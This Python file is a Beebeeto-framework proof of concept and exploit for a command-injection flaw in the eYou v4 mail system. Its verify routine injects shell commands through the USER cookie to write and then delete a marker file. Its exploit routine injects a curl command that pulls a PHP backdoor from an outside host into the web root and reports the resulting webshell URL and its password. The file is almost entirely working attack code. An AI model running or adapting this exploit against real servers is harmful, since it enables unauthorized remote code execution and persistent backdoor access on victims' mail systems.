#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import string
import random
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0055',
            'name': 'eYou v4 /storage_explore.php 命令执行漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2014-10-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eYou',
            'vul_version': ['4'],
            'type': 'Command Execution',
            'tag': ['eYou漏洞', 'Command Execution', '命令执行漏洞'],
            'desc': '''
                    eyou邮件系统V4存在一处/user/storage_explore.php页面，该页面调用了
                    getUserDirPath($uid, $domain)函数，该函数存在的$path = `$cmd`代码
                    使得CMD控制台可以直接调用。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-058301',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        try:
            # random
            random_str = lambda x: ''.join(random.sample(string.letters+string.digits, x))
            vul_url_get_path = '%s/user/list.php' % url
            vul_url_get_shell = '%s/user/storage_explore.php' % url
            match_path = re.compile('eyou_error\(\) in <b>(.*)/list\.php</b> on line')
            remove_flag = 0
            # main
            response = urllib2.urlopen(vul_url_get_path).read()
            path = match_path.findall(response)
            if path:
                file_name = random_str(5)
                headers = {'Cookie': 'USER=UID=1+|echo tEst_bY_360 > %s/%s.txt' % (path[0], file_name)}
                urllib2.urlopen(urllib2.Request(vul_url_get_shell, headers=headers)).read()
                response = urllib2.urlopen('%s/user/%s.txt' % (url, file_name)).read()
                # remove verify txt
                headers = {'Cookie': 'USER=UID=1+|rm %s/%s.txt' % (path[0], file_name)}
                urllib2.urlopen(urllib2.Request(vul_url_get_shell, headers=headers)).read()
                if 'tEst_bY_360' in response:
                    args['success'] = True
                    args['poc_ret']['Verify_URL'] = vul_url_get_shell
                    args['poc_ret']['Postdata'] = str(headers)
                    return args
                remove_flag = 1
                urllib2.urlopen('%s/user/%s.txt' % (url, file_name)).read()
            args['success'] = False
            return args
        except urllib2.HTTPError, e:
            if remove_flag and e.code == 404:
                args['success'] = True
                args['poc_ret']['Verify_URL'] = vul_url_get_shell
                args['poc_ret']['Postdata'] = str(headers)
                return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        # remote backdoor
        php_backdoor = 'http://www.hackersoul.com/tools/php-backdoor-1.txt'
        # random
        random_str = lambda x: ''.join(random.sample(string.letters+string.digits, x))
        vul_url_get_path = '%s/user/list.php' % url
        vul_url_get_shell = '%s/user/storage_explore.php' % url
        match_path = re.compile('eyou_error\(\) in <b>(.*)/list\.php</b> on line')
        remove_flag = 0
        # main
        response = urllib2.urlopen(vul_url_get_path).read()
        path = match_path.findall(response)
        if path:
            file_name = random_str(5)
            headers = {'Cookie': 'USER=UID=1+|curl %s > %s/%s.php' % (php_backdoor, path[0], file_name)}
            urllib2.urlopen(urllib2.Request(vul_url_get_shell, headers=headers)).read()
            data = {'c': 'echo strrev(b2ef2cd728d8ec);'}
            response = urllib2.urlopen('%s/user/%s.php' % (url, file_name), urllib.urlencode(data)).read()
            if 'b2ef2cd728d8ec'[::-1] in response:
                args['success'] = True
                args['poc_ret']['webshell'] = '%s/user/%s.php' % (url, file_name)
                args['poc_ret']['shell_pwd'] = 'test'
                return args
            args['success'] = False
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
